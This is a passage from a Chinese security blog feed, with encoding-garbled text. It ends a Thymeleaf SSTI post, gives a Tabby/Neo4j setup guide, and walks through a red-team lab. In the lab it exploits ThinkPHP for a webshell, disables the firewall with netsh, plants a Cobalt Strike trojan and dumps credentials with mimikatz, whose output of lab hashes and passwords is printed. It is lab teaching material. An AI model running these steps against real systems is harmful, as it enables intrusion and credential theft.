·ä¸å†ç”± Spring ThymeleafViewæ¥è¿›è¡Œè§£æï¼Œè€Œæ˜¯ç”± RedirectView æ¥è¿›è¡Œè§£æã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url; <span class="hljs-comment">//FP as redirects are not resolved as expressions</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>åœ¨æ–¹æ³•å‚æ•°ä¸­åŠ ä¸Š HttpServletResponse å‚æ•°</p><p>ç”±äºcontrollerçš„å‚æ•°è¢«è®¾ç½®ä¸ºHttpServletResponseï¼ŒSpringè®¤ä¸ºå®ƒå·²ç»å¤„ç†äº†HTTP Responseï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿè§†å›¾åç§°è§£æã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document, HttpServletResponse response)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>ä¸è¿‡è¿™äº›ä¿®å¤éƒ½æ¯”è¾ƒä¸´æ—¶ï¼Œè¿˜æ˜¯å‡çº§åˆ°æ–°ç‰ˆæœ¬æ¯”è¾ƒå¥½</p><p>å°±å…ˆçœ‹è¿™ä¹ˆå¤šå§ï¼Œæ–°ç‰ˆæœ¬è¿˜æœ‰ç‚¹ä¸œè¥¿æœ‰ç‚¹æ‡’äº†ä¸æƒ³å†™äº†ï¼Œä¹‹åé‡åˆ°å†å­¦ï¼Œæ¯•ç«Ÿå®æˆ˜æ„Ÿè§‰è¿™ç§sstiå¹¶ä¸ä¼šå¾ˆå¤šğŸ¥²</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD">https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD</a></p><p><a href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p><p><a href="https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabbyä½¿ç”¨å­¦ä¹ </title>
      <link href="/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>è·Ÿç€å®˜æ–¹ç¯å¢ƒæ¥ï¼Œä½†æ˜¯å…·ä½“ä¸Šåˆæœ‰ç‚¹å‡ºå…¥ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹è¯¦ç»†æ­¥éª¤ï¼Œå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.yuque.com/wh1t3p1g/tp0c1t/rmm0aimycci76ysm">https://www.yuque.com/wh1t3p1g/tp0c1t/rmm0aimycci76ysm</a></p><p>é¦–å…ˆå®˜ç½‘ä¸‹è½½tabbyçš„zipæ–‡ä»¶ï¼š<a href="https://github.com/wh1t3p1g/tabby/releases/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E9%9C%80%E8%A6%81%E7%9A%84%E4%B8%9C%E8%A5%BF%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%86">https://github.com/wh1t3p1g/tabby/releases/ï¼Œé‡Œé¢æ‰€æœ‰éœ€è¦çš„ä¸œè¥¿éƒ½åŒ…å«äº†</a></p><h2 id="æ•°æ®åº“é…ç½®"><a href="#æ•°æ®åº“é…ç½®" class="headerlink" title="æ•°æ®åº“é…ç½®"></a>æ•°æ®åº“é…ç½®</h2><p>è¿™ä¸€æ­¥æ¯”è¾ƒé‡è¦ï¼Œæ–‡æ¡£é‡Œé¢è¦çš„apocæ’ä»¶å’Œtabby-path-finderæ’ä»¶éƒ½åŒ…å«åœ¨å®˜æ–¹çš„zipé‡Œé¢äº†</p><p>ç„¶åæ–°å»ºä¸€ä¸ªNeo4jé¡¹ç›®æ¥ç»™tabbyä½¿ç”¨ï¼ŒåŒæ—¶åˆ›å»ºä¸€ä¸ªDBMS</p><p><img src="https://cdn.clown2024.cn/image-20241201012220397.png" alt="image-20241201012220397"></p><p>é‡Œé¢æœ‰ä¸€ä¸ªé»˜è®¤çš„neo4jæ•°æ®åº“ï¼Œç”¨è¿™ä¸ªå°±å¥½äº†</p><p>ç„¶åé…ç½®tabbyçš„æ•°æ®åº“è´¦å·å¯†ç ï¼Œtabby &gt;&#x3D; 1.3.x ç‰ˆæœ¬çš„æ•°æ®åº“é…ç½®æ”¾ç½®äº <code>config/db.properties</code>ï¼Œæˆ‘è¿™é‡Œæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ‰‹åŠ¨åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># for docker<br>tabby.cache.isDockerImportPath            = false<br><br># db settings<br>tabby.neo4j.username                      = neo4j<br>tabby.neo4j.password                      = password<br>tabby.neo4j.url                           = bolt://127.0.0.1:7687<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201012611132.png" alt="image-20241201012611132"></p><p>ç„¶åé…ç½®ä¸€ä¸‹æˆ‘ä»¬åˆšæ–°å»ºçš„æ•°æ®åº“</p><p>ç‚¹è¿™é‡Œè¿›å»</p><p><img src="https://cdn.clown2024.cn/image-20241201012904191.png" alt="image-20241201012904191"></p><p><img src="https://cdn.clown2024.cn/image-20241201012920619.png" alt="image-20241201012920619"></p><p>ç„¶åæ‰¾åˆ°å¯¹åº”çš„é…ç½®é¡¹ï¼Œä¿®æ”¹ä¸‹é¢è¿™äº›å†…å®¹ï¼Œæ²¡æœ‰å°±è‡ªå·±åˆ›å»º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># æ³¨é‡Šä¸‹é¢çš„é…ç½®ï¼Œå…è®¸ä»æœ¬åœ°ä»»æ„ä½ç½®è½½å…¥csvæ–‡ä»¶<br>#server.directories.import=import<br><br># å…è®¸ apoc æ‰©å±•<br>dbms.security.procedures.unrestricted=jwt.security.*,apoc.*<br><br># ä¿®æ”¹å†…å­˜ç›¸å…³é…ç½® <br># å¯ä»¥é€šè¿‡å®˜æ–¹çš„neo4j-adminæ¥æ¨èé…ç½®å†…å­˜å¤§å°ï¼Œhttps://neo4j.com/docs/operations-manual/current/tools/neo4j-admin/neo4j-admin-memrec/<br>dbms.memory.heap.initial_size=1G<br>dbms.memory.heap.max_size=4G<br>dbms.memory.pagecache.size=4G<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯é…ç½®apocï¼Œå…ˆæ‰¾åˆ°é…ç½®æ–‡ä»¶çš„ç›®å½•</p><p>ç‚¹å‡»è¿™é‡Œä¼šç›´æ¥æ‰“å¼€å½“å‰é¡¹ç›®çš„é…ç½®æ–‡ä»¶ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241201013409500.png" alt="image-20241201013409500"></p><p><img src="https://cdn.clown2024.cn/image-20241201013343735.png" alt="image-20241201013343735"></p><p>æ–°å»ºapoc.confæ–‡ä»¶ï¼Œé…ç½®ä¸‹é¢å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">apoc.import.file.enabled=true<br>apoc.import.file.use_neo4j_config=false<br></code></pre></td></tr></table></figure><p>æœ€åé…ç½®ä¸€ä¸‹ apoc å’Œ tabby-path-finder æ’ä»¶ï¼Œæ‰“å¼€ plugins ç›®å½•å°†å¯¹åº”çš„ jar å¤åˆ¶åˆ°è¯¥ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241201013423656.png" alt="image-20241201013423656"></p><p>è¿™é‡Œä¸‹è½½çš„ä¸¤ä¸ªæ’ä»¶ç‰ˆæœ¬æœ‰è®²ç©¶ï¼Œä¸€å¼€å§‹æ¼çœ‹äº†ï¼Œå¯¼è‡´æ’ä»¶åŠ è½½å®Œæ•°æ®åº“éƒ½èµ·ä¸æ¥</p><blockquote><p>å…³äº apoc æ’ä»¶çš„ç‰ˆæœ¬é€‰æ‹©æ–¹æ³•ï¼šNeo4j æ•°æ®åº“ç‰ˆæœ¬çš„å‰ä¸¤ä½å¯¹åº” apoc æ’ä»¶çš„ç‰ˆæœ¬<br>æ¯”å¦‚ æˆ‘Neo4j æ•°æ®åº“ç‰ˆæœ¬ä¸º v5.24.0ï¼Œåˆ™é€‰æ‹© apoc æ’ä»¶ v5.2.x ç‰ˆæœ¬</p></blockquote><p>æˆ‘è¿™é‡Œå°±é€‰äº†ä¸¤ä¸ª5.24çš„</p><p><img src="https://cdn.clown2024.cn/image-20241201020830325.png" alt="image-20241201020830325"></p><p>ä¸Šè¿°æ­¥éª¤å®Œæˆä¹‹åé‡å¯æ•°æ®åº“</p><p>è¾“å…¥ä¸‹é¢ä¸¤ä¸ªæŒ‡ä»¤æ£€æŸ¥æ˜¯å¦é…ç½®æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">CALL apoc.help(&#x27;all&#x27;)<br>CALL tabby.help(&#x27;tabby&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201020937163.png" alt="image-20241201020937163"></p><p>ç„¶åå°±æ˜¯é…ç½®å›¾æ•°æ®åº“ç´¢å¼•ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†åŠ å¿«å¯¼å…¥&#x2F;åˆ é™¤çš„é€Ÿåº¦ï¼Œæå‰å¯¹èŠ‚ç‚¹è¿›è¡Œç´¢å¼•å»ºç«‹</p><p>æ‰§è¡Œä¸‹é¢çš„cypherè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;<br>CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;<br>CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;<br>CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;<br>CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);<br>CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);<br>CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);<br>CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);<br>CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);<br>CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);<br>CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);<br>:schema //æŸ¥çœ‹è¡¨åº“<br>:sysinfo //æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201021159909.png" alt="image-20241201021159909"></p><p><img src="https://cdn.clown2024.cn/image-20241201021255464.png" alt="image-20241201021255464"></p><p>è¿™æ˜¯åˆ é™¤æ‰€æœ‰çº¦æŸçš„è¯­å¥ï¼Œæœ‰éœ€è¦å¯ä»¥ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">DROP CONSTRAINT c1;<br>DROP CONSTRAINT c2;<br>DROP CONSTRAINT c3;<br>DROP CONSTRAINT c4;<br>DROP INDEX index1;<br>DROP INDEX index2;<br>DROP INDEX index3;<br>DROP INDEX index4;<br>DROP INDEX index5;<br>DROP INDEX index6;<br>DROP INDEX index7;<br></code></pre></td></tr></table></figure><h2 id="ideaæ’ä»¶å®‰è£…"><a href="#ideaæ’ä»¶å®‰è£…" class="headerlink" title="ideaæ’ä»¶å®‰è£…"></a>ideaæ’ä»¶å®‰è£…</h2><p>è¯¥æ’ä»¶æ˜¯ç”¨æ¥åŠ é€Ÿæˆ‘ä»¬çš„åˆ†æè¿‡ç¨‹çš„ï¼Œé€šå¸¸ä¸€æ¬¡å®Œæ•´çš„tabbyä½¿ç”¨æµç¨‹ä¸ºä¸‹é¢å‡ æ­¥ï¼š</p><ol><li>ç”Ÿæˆä»£ç å±æ€§å›¾</li><li>å¯¼å…¥å›¾æ•°æ®åº“neo4j</li><li>ä½¿ç”¨browseræŸ¥è¯¢æŒ‡å®šcypherè¯­å¥</li><li>å¤åˆ¶å¯¹åº”çš„classnameç­‰ä¿¡æ¯ååœ¨IDEAå®šä½åˆ°å¯¹åº”ä»£ç è¿›è¡Œäººå·¥ç¡®è®¤</li></ol><p>æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¸‹è½½å®‰è£…æ’ä»¶ï¼Œæ’ä»¶åœ°å€ï¼š<a href="https://github.com/wh1t3p1g/tabby-intellij-plugin">https://github.com/wh1t3p1g/tabby-intellij-plugin</a></p><p>ä¸‹è½½å¥½æ˜¯ä¸€ä¸ªzipæ–‡ä»¶ï¼Œç„¶åå»ideaçš„æ’ä»¶å¸‚åœºé€‰æ‹©ä»ç£ç›˜å®‰è£…æ’ä»¶</p><p><img src="https://cdn.clown2024.cn/image-20241201021913952.png" alt="image-20241201021913952"></p><p>ç›´æ¥é€‰æ‹©æˆ‘ä»¬çš„zipæ–‡ä»¶ï¼Œä¸‹è½½å¥½åå¯ä»¥åœ¨å·²å®‰è£…æ’ä»¶ä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20241201022205930.png" alt="image-20241201022205930"></p><p>ç„¶åé…ç½®å¯¹åº”çš„æ•°æ®æº</p><p><img src="https://cdn.clown2024.cn/image-20241201022319862.png" alt="image-20241201022319862"></p><h1 id="è¿è¡Œç¤ºä¾‹"><a href="#è¿è¡Œç¤ºä¾‹" class="headerlink" title="è¿è¡Œç¤ºä¾‹"></a>è¿è¡Œç¤ºä¾‹</h1><p>è¿™é‡Œåœ¨caseç›®å½•é‡Œé¢æ”¾äº†ä¸€ä¸ªcc3.2.1çš„ä¾èµ–</p><p>ç„¶åä¸‹é¢å‘½ä»¤å¼€å§‹åˆ†æç”Ÿæˆæ•°æ®</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -Xmx4g -jar tabby.jar<br></code></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šåœ¨outputç›®å½•ä¸‹ç”Ÿæˆä¸€ç³»åˆ—csvæ–‡ä»¶</p><p><img src="https://cdn.clown2024.cn/image-20241201140610659.png" alt="image-20241201140610659"></p><p>é«˜ç‰ˆæœ¬éœ€è¦ä½¿ç”¨tabby-vul-finderæ¥æ‰‹åŠ¨å¯¼å…¥ç”Ÿæˆçš„ç»“æœåˆ°å›¾æ•°æ®åº“ä¸­ï¼Œæ–‡ä»¶åœ°å€ï¼š<a href="https://github.com/wh1t3p1g/tabby-vul-finder">https://github.com/wh1t3p1g/tabby-vul-finder</a></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -jar tabby-vul-finder.jar load D:\CTF\Java\å·¥å…·\tabby\output\dev<br></code></pre></td></tr></table></figure><p>è¿™æ ·å³å¯å®Œæˆå¯¼å…¥</p><p><img src="https://cdn.clown2024.cn/image-20241201140654291.png" alt="image-20241201140654291"></p><p>å±æ€§å›¾çš„ä»‹ç»åœ¨å®˜æ–¹æ–‡æ¡£é‡Œæœ‰è¯´æ˜ï¼š<a href="https://www.yuque.com/wh1t3p1g/tp0c1t/pppuq72tfhmic3g4">https://www.yuque.com/wh1t3p1g/tp0c1t/pppuq72tfhmic3g4</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ—¥é¶åœºäº”</title>
      <link href="/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/"/>
      <url>/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p><strong>è™šæ‹Ÿæœºå¯†ç </strong></p><p><strong>win7</strong></p><p>sun\heart 123.com</p><p>sun\Administrator dc123.comï¼ˆå› ä¸ºè¿‡æœŸäº†ï¼Œæ”¹æˆAdmin12345ï¼‰</p><p><strong>2008</strong></p><p>sun\admin 2020.comï¼ˆæ”¹æˆ2022.comï¼‰</p><p>Win7åŒç½‘å¡æ¨¡æ‹Ÿå†…å¤–ç½‘</p><p>ä»…ä¸»æœºæ¨¡å¼ç½‘å¡ï¼š192.168.138.0</p><p>NATæ¨¡å¼ç½‘å¡ï¼š192.168.135.0</p><p>é…ç½®å¥½åéœ€è¦è¿›å…¥win7ä¸»æœºå°†phpstudyæœåŠ¡å¼€èµ·æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241121125028618.png" alt="image-20241121125028618"></p><p>emmmè¯•äº†ä¸€ä¸‹åˆæ˜¯ä¸èƒ½pingé€šçš„ï¼Œä½†æ˜¯ç½‘é¡µèƒ½æ­£å¸¸è®¿é—®</p><h1 id="è€ƒç‚¹æ€è·¯"><a href="#è€ƒç‚¹æ€è·¯" class="headerlink" title="è€ƒç‚¹æ€è·¯"></a>è€ƒç‚¹æ€è·¯</h1><p><strong>ä¸€ã€ç¯å¢ƒæ­å»º</strong></p><ul><li><p>1.ç¯å¢ƒæ­å»ºæµ‹è¯•</p></li><li><p>2.ä¿¡æ¯æ”¶é›†</p></li></ul><p><strong>äºŒã€æ¼æ´åˆ©ç”¨</strong></p><ul><li><p>3.æ¼æ´æœç´¢ä¸åˆ©ç”¨</p></li><li><p>4.æ¼æ´åˆ©ç”¨Getshell</p></li><li><p>5.ç³»ç»Ÿä¿¡æ¯æ”¶é›†</p></li><li><p>6.ä¸»æœºå¯†ç æ”¶é›†</p></li></ul><p><strong>ä¸‰ã€å†…ç½‘æœé›†</strong></p><ul><li><p>7.å†…ç½‘â€“ç»§ç»­ä¿¡æ¯æ”¶é›†</p></li><li><p>8.å†…ç½‘æ”»å‡»å§¿åŠ¿â€“MS14-058</p></li><li><p>9.å†…ç½‘æ”»å‡»å§¿åŠ¿â€“MS17-010</p></li></ul><p><strong>å››ã€æ¨ªå‘ç§»åŠ¨</strong></p><ul><li><p>10.psexecè¿œæ§</p></li><li><p>11.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£</p></li><li><p>12.netshå¢åˆ é˜²ç«å¢™è§„åˆ™</p></li></ul><p><strong>äº”ã€æ„å»ºé€šé“</strong></p><ul><li>13.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘</li></ul><p><strong>å…­ã€æŒä¹…æ§åˆ¶</strong></p><ul><li><p>14.åŸŸæ¸—é€-åŸŸæˆå‘˜ä¿¡æ¯æ”¶é›†</p></li><li><p>15.åŸŸæ¸—é€-åŸºç¡€æœåŠ¡å¼±å£ä»¤æ¢æµ‹åŠæ·±åº¦åˆ©ç”¨ä¹‹powershell</p></li><li><p>16.åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨]</p></li><li><p>17.åŸŸæ¸—é€-åŸŸæ§å®ç°ä¸åˆ©ç”¨</p></li></ul><p><strong>ä¸ƒã€ç—•è¿¹æ¸…ç†</strong></p><ul><li>18ã€æ—¥å¿—æ¸…ç†</li></ul><h1 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h1><p>å…ˆarp-scan -lçœ‹ä¸€ä¸‹å­˜æ´»ä¸»æœº</p><p><img src="https://cdn.clown2024.cn/image-20241121125732100.png" alt="image-20241121125732100"></p><p>æ‹¿åˆ°webæœåŠ¡å™¨åœ°å€ï¼š192.168.135.150</p><p>åšä¸€ä¸‹ç«¯å£æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sS -v 192.168.135.150<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸¤ä¸ªç«¯å£ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PORT     STATE SERVICE<br>80/tcp   open  http<br>3306/tcp open  mysql<br></code></pre></td></tr></table></figure><p>ç„¶åfscanæ‰«å‡ºæ¥ä¸€ä¸ª135ç«¯å£å¼€æ”¾ï¼Œä½†æ˜¯æˆ‘çš„fscanæ¼æ´æ¢æµ‹ä¸äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬æ‰‹åŠ¨å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121130427924.png" alt="image-20241121130427924"></p><p>è®¿é—®ä¸€ä¸‹80ç«¯å£çš„æœåŠ¡å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªthinkphp5çš„æœåŠ¡</p><p><img src="https://cdn.clown2024.cn/image-20241121125627193.png" alt="image-20241121125627193"></p><p>ç”¨å·¥å…·ï¼š<a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3%E6%88%96%E8%80%85https://github.com/bewhale/thinkphp_gui_tools%E7%9C%8B%E7%9C%8B%E8%83%BD%E4%B8%8D%E8%83%BD%E4%B8%80%E6%8A%8A%E6%A2%AD%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%9C%80%E5%A5%BD%E4%BD%BF%E7%94%A8java8%E6%9D%A5%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E5%8E%BBOracle%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AAjava8%E7%9A%84jdk">https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3æˆ–è€…https://github.com/bewhale/thinkphp_gui_toolsçœ‹çœ‹èƒ½ä¸èƒ½ä¸€æŠŠæ¢­ï¼Œä¸è¿‡æœ€å¥½ä½¿ç”¨java8æ¥è¿è¡Œï¼Œè¿™é‡Œå¯ä»¥å»Oracleä¸‹è½½ä¸€ä¸ªjava8çš„jdk</a></p><p><img src="https://cdn.clown2024.cn/image-20241121132256316.png" alt="image-20241121132256316"></p><p>è§£å‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">tar -xzvf jdk-8u401-linux-x64.tar.gz <br></code></pre></td></tr></table></figure><blockquote><p>æœ‰ç‚¹ç”·æ³µï¼Œè¿™å°kaliä¸€ç›´è¯´æˆ‘è¶…å†…å­˜ï¼Œæˆ‘æ¢äº†ä¸€å°kaliå°±å¯ä»¥äº†</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241121161223838.png" alt="image-20241121161223838"></p><p>å¯ä»¥çœ‹åˆ°æ‰«å‡ºäº†å››ä¸ªæ´äº†ï¼Œè¿™ä¸‹å¯ä»¥ä¸€æŠŠæ¢­äº†</p><p>é€‰æ‹©å¯¹åº”pocæ‰§è¡Œä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121161320128.png" alt="image-20241121161320128"></p><p>å‘ç°å¯ä»¥æˆåŠŸï¼Œé‚£è¿™æ—¶å€™å°±ç›´æ¥getshellèšå‰‘è¿ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121162241375.png" alt="image-20241121162241375"></p><p><img src="https://cdn.clown2024.cn/image-20241121162256002.png" alt="image-20241121162256002"></p><p>æˆåŠŸè¿æ¥</p><p>ä¸è¿‡ä¸ºäº†æ–¹ä¾¿ä¸Šä¼ csé©¬è¿™é‡Œè¿˜æ˜¯ä¸Šä¼ ä¸€ä¸ªå†°èé©¬æ¥è¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241121163421297.png" alt="image-20241121163421297"></p><p>ç„¶åå…³ä¸€ä¸‹é˜²ç«å¢™å…ˆ</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241121163742545.png" alt="image-20241121163742545"></p><p>ç„¶åä¸Šä¼ ä¸€ä¸ªcsçš„æœ¨é©¬</p><p><img src="https://cdn.clown2024.cn/image-20241121164338443.png" alt="image-20241121164338443"></p><p>ç„¶åè¿è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241121164413507.png" alt="image-20241121164413507"></p><p>å¯ä»¥çœ‹åˆ°ä¸»æœºæˆåŠŸä¸Šçº¿</p><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><p>å¸¸è§„net viewçœ‹ä¸€ä¸‹ä¸»æœº</p><p><img src="https://cdn.clown2024.cn/image-20241121164636888.png" alt="image-20241121164636888"></p><p>å¯ä»¥çœ‹åˆ°åŸŸæ§çš„åœ°å€ä¸ºï¼š192.168.138.138</p><p>ç„¶åmimikatzè¿›è¡Œlogonpasswordsæ‹¿ä¸€ä¸‹å¯†ç ä¿¡æ¯</p><p><img src="https://cdn.clown2024.cn/image-20241121164833388.png" alt="image-20241121164833388"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Authentication Id : 0 ; 151193 (00000000:00024e99)<br>Session           : Interactive from 1<br>User Name         : Administrator<br>Domain            : SUN<br>Logon Server      : DC<br>Logon Time        : 2024/11/21 12:44:44<br>SID               : S-1-5-21-3388020223-1982701712-4030140183-500<br>msv :<br> [00000003] Primary<br> * Username : Administrator<br> * Domain   : SUN<br> * LM       : ac804745ee68ebea48116059303a4365<br> * NTLM     : ccef208c6485269c20db2cad21734fe7<br> * SHA1     : 58d1a25c09f4ee98209941b2b333fbe477d472a9<br>tspkg :<br> * Username : Administrator<br> * Domain   : SUN<br> * Password : Admin12345<br>wdigest :<br> * Username : Administrator<br> * Domain   : SUN<br> * Password : Admin12345<br>kerberos :<br> * Username : Administrator<br> * Domain   : SUN.COM<br> * Password : Admin12345<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 997 (00000000:000003e5)<br>Session           : Service from 0<br>User Name         : LOCAL SERVICE<br>Domain            : NT AUTHORITY<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-19<br>msv :<br>tspkg :<br>wdigest :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>kerberos :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 996 (00000000:000003e4)<br>Session           : Service from 0<br>User Name         : WIN7$<br>Domain            : SUN<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-20<br>msv :<br> [00000003] Primary<br> * Username : WIN7$<br> * Domain   : SUN<br> * NTLM     : 19a799ef7003f143f69e5eb204369f74<br> * SHA1     : e7a55023d5275327b14b77af9fb37f9929ce114d<br>tspkg :<br>wdigest :<br> * Username : WIN7$<br> * Domain   : SUN<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 